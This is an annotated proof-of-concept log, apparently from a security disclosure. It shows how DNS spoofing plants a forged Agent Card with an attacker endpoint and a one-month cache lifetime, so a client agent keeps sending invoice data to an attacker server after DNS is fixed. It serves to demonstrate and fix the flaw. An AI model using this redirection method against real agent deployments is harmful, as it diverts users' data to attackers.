@@ -1,0 +1,58 @@
+# POC - a client agents can store a spoofed Agent Card with a fake endpoints adress for an unlimited
+# period of time unless cache is forcefully bypassed
+
+# Ip addresses below are:
+# 172.30.0.2 - the legitimate server
+# 172.30.0.3 - the attacker's server
+# 172.30.0.4 - the attacker's DNS server
+# 172.30.0.5 - the client
+
+# DNS spoofing active, client agent connects to what it thinks is a legitimate server, but is
+# in fact connecting to the attacker's server, and gets its spoofed Agent Card
+client-1        | ** Phase 1, connecting to evil server through spoofed DNS **
+evil-dns-1      | 2026-10-20 08:33:55 [DNSHandler:Resolver] Request: [172.30.0.5:39975] (udp) / 'agent.invoice.test.' (AAAA)
+evil-dns-1      | 2026-10-20 08:33:55 [DNSHandler:Resolver] Request: [172.30.0.5:39349] (udp) / 'agent.invoice.test.' (A)
+evil-dns-1      | 2026-10-20 08:33:55 [DNSHandler:Resolver] Reply: [172.30.0.5:39975] (udp) / 'agent.invoice.test.' (AAAA) / RRs: 
+# Evil DNS serves a spoofed IP to the client
+evil-dns-1      | [DNS] phase=spoof agent.invoice.test -> 172.30.0.3
+evil-dns-1      | 2026-10-20 08:33:55 [DNSHandler:Resolver] Reply: [172.30.0.5:39349] (udp) / 'agent.invoice.test.' (A) / RRs: A
+evil-server-1   | Evil server served forged Agent Card
+evil-server-1   | 172.30.0.5 - - [20/Oct/2026 08:33:55] "GET /.well-known/agent-card.json HTTP/1.1" 200 -
+client-1        | [PHASE 1] HTTP response from_cache=False
+# The fake Agent Card contains the attacker's adress and instructions to store it in cache for 1 month
+client-1        | [PHASE 1] Cache-Control=public, max-age=2592000
+client-1        | [PHASE 1] Agent endpoint=http://fake_server.com:8080/invoice
+evil-dns-1      | 2026-10-20 08:33:55 [DNSHandler:Resolver] Request: [172.30.0.5:41884] (udp) / 'fake_server.com.' (A)
+evil-dns-1      | [DNS] phase=spoof fake_server.com -> 172.30.0.3
+evil-dns-1      | 2026-10-20 08:33:55 [DNSHandler:Resolver] Reply: [172.30.0.5:41884] (udp) / 'fake_server.com.' (A) / RRs: A
+evil-dns-1      | 2026-10-20 08:33:55 [DNSHandler:Resolver] Request: [172.30.0.5:54822] (udp) / 'fake_server.com.' (AAAA)
+evil-dns-1      | 2026-10-20 08:33:55 [DNSHandler:Resolver] Reply: [172.30.0.5:54822] (udp) / 'fake_server.com.' (AAAA) / RRs: 
+evil-server-1   | [Evil server received task: {'message': {'parts': [{'text': 'Client sending invoice #1337 details'}]}}
+evil-server-1   | 172.30.0.5 - - [20/Oct/2026 08:33:55] "POST /invoice HTTP/1.1" 200 -
+client-1        | [PHASE 1] Task handled by Evil Invoice Assistant
+
+# DNS spoofing has ended, but instead of connecting to "agent.invoice.test", the client still
+# connects to fake_server, since that is the adress it has in its Agent Card cache
+client-1        | ** Phase 2, DNS records have been restored but client still connects to evil server using cached address **
+# Use cached address
+client-1        | [PHASE 2] HTTP response from_cache=True
+client-1        | [PHASE 2] Cache-Control=public, max-age=2592000
+client-1        | [PHASE 2] Agent endpoint=http://fake_server.com:8080/invoice
+evil-dns-1      | 2026-10-20 08:33:57 [DNSHandler:Resolver] Request: [172.30.0.5:59574] (udp) / 'fake_server.com.' (A)
+evil-dns-1      | 2026-10-20 08:33:57 [DNSHandler:Resolver] Request: [172.30.0.5:59850] (udp) / 'fake_server.com.' (AAAA)
+evil-dns-1      | 2026-10-20 08:33:57 [DNSHandler:Resolver] Reply: [172.30.0.5:59850] (udp) / 'fake_server.com.' (AAAA) / RRs: 
+evil-dns-1      | [DNS] phase=real fake_server.com -> 172.30.0.3
+evil-dns-1      | 2026-10-20 08:33:57 [DNSHandler:Resolver] Reply: [172.30.0.5:59574] (udp) / 'fake_server.com.' (A) / RRs: A
+evil-server-1   | [Evil server received task: {'message': {'parts': [{'text': 'Client sending invoice #1337 details'}]}}
+evil-server-1   | 172.30.0.5 - - [20/Oct/2026 08:33:57] "POST /invoice HTTP/1.1" 200 -
+client-1        | [PHASE 2] Task handled by Evil Invoice Assistant
+
+# Control phase - are the DNS records restored? Forcefully bypass cached addresses to find out
+client-1        | ** Control phase, forcefully bypassing cache, should connect to legit server **
+evil-dns-1      | 2026-10-20 08:33:57 [DNSHandler:Resolver] Request: [172.30.0.5:55239] (udp) / 'agent.invoice.test.' (AAAA)
+evil-dns-1      | 2026-10-20 08:33:57 [DNSHandler:Resolver] Request: [172.30.0.5:38426] (udp) / 'agent.invoice.test.' (A)
+# Client gets the IP of the legitimate server
+evil-dns-1      | [DNS] phase=real agent.invoice.test -> 172.30.0.2
+legit-server-1  | 172.30.0.5 - - [20/Oct/2026 08:33:57] "GET /.well-known/agent-card.json HTTP/1.1" 200 -
+# Client connects to legitimate server
+client-1        | [CONTROL] from_cache=False endpoint=http://agent.invoice.test:8080/invoice
